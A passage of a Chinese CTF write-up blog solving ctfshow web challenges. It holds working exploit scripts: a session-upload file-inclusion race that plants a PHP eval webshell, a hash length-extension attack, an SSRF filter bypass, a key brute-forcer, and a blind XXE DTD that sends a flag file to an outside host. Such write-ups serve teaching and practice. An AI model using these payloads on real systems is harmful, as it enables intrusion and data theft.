class="line">m=hashpumpy.hashpump(hsh,s1,s2,i)</span><br><span class="line"><span class="comment">#print i</span></span><br><span class="line">name=urllib.quote(urllib.unquote(m[<span class="number">1</span>]))</span><br><span class="line">uri=url+<span class="string">&#x27;name=&#x27;</span>+name+<span class="string">&quot;&amp;pass=&quot;</span>+m[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print uri</span></span><br><span class="line">r=requests.get(uri)</span><br><span class="line"><span class="comment"># print r.text</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> r.text;</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到<code>flflflflag.php</code>，访问会跳转，抓包在源码里发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure><p>尝试包含session上传进度getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/flflflflag.php&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=dddd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                <span class="comment">#上传无效的空文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27;</span>     </span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">        <span class="comment"># print(&#x27;[+]POST&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t=r.get(url+<span class="string">&quot;?file=/tmp/sess_dddd&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            <span class="comment"># print(&#x27;[+]retry&#x27;)</span></span><br><span class="line">            print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=POST,args=()).start()</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><p>蚁剑连上bypass disable_function,flag在环境变量里，这题就是NPUCTF原题</p><p>贴一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;Hash&quot;</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h3><h3 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h3><p>扫目录发现<code>www.zip</code>，主要代码都在<code>lib.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看下反序列化链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct() &#x3D;&#x3D;&gt; User::__toString() &#x3D;&#x3D;&gt; Info::__call()  &#x3D;&#x3D;&gt; </span><br></pre></td></tr></table></figure><h3 id="web1观字WEB-AK赛"><a href="#web1观字WEB-AK赛" class="headerlink" title="web1观字WEB_AK赛"></a>web1观字WEB_AK赛</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in http://192.168.7.68/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $protocol = substr($url, <span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>($protocol!=<span class="string">&#x27;http://&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;仅限http协议访问&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;仅限域名地址访问&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&#x27;curl &#x27;</span>.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了一大堆东西，直接中文句号绕过<code>。</code>，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;192。168。7。68&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="web3观图WEB-AK赛"><a href="#web3观图WEB-AK赛" class="headerlink" title="web3观图WEB_AK赛"></a>web3观图WEB_AK赛</h3><p>查看源码发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showImage.php?image&#x3D;Z6Ilu83MIDw&#x3D;</span><br></pre></td></tr></table></figure><p>将image改成<code>image[]=</code>报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: openssl_decrypt() expects parameter 1 to be string, array given in &#x2F;var&#x2F;www&#x2F;html&#x2F;showImage.php on line 8</span><br></pre></td></tr></table></figure><p>直接访问<code>showImage.php</code>会有源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$key = substr(md5(&#x27;ctfshow&#x27;.rand()),3,8);</span></span><br><span class="line"><span class="comment">//flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;image&#x27;</span>]))&#123;</span><br><span class="line">    $image=$_GET[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">&#x27;bf-ecb&#x27;</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($str))&#123;</span><br><span class="line">        header(<span class="string">&#x27;content-type:image/gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>爆破key吧，脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$image &#x3D; &quot;Z6Ilu83MIDw&#x3D;&quot;;</span><br><span class="line">for($i&#x3D;0;$i&lt;100000;$i++)&#123;</span><br><span class="line">    $key &#x3D; substr(md5(&#39;ctfshow&#39;.$i),3,8);</span><br><span class="line">    $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);</span><br><span class="line">    if(strpos($str,&#39;jpg&#39;)||strpos($str,&#39;png&#39;)||strpos($str,&#39;gif&#39;))&#123;</span><br><span class="line">        echo &#39;key:&#39;.$key;</span><br><span class="line">        echo &quot;\nrand():&quot;.$i;</span><br><span class="line">        $a &#x3D; openssl_encrypt(&quot;config.php&quot;,&quot;bf-ecb&quot;,$key);</span><br><span class="line">        echo &quot;\nanser:&quot;.$a;</span><br><span class="line">        echo &quot;\nfile:&quot;.$str;</span><br><span class="line">        break;      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web4观心WEB-AK赛"><a href="#web4观心WEB-AK赛" class="headerlink" title="web4观心WEB_AK赛"></a>web4观心WEB_AK赛</h3><p>在<code>js/common.js</code>里看到<code>api.php</code>，占卜抓包发现</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200928230754.png"></p><p>貌似是xxe,无回显的，猜测直接用<code>file_get_contents</code>得到xml文件的</p><p>服务端的xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://1.1.1.1/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p><code>test.dtd</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;1.1.1.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="签到观己WEB-AK赛"><a href="#签到观己WEB-AK赛" class="headerlink" title="签到观己WEB_AK赛"></a>签到观己WEB_AK赛</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php/i&#x27;</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接包含上传进度进度就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span 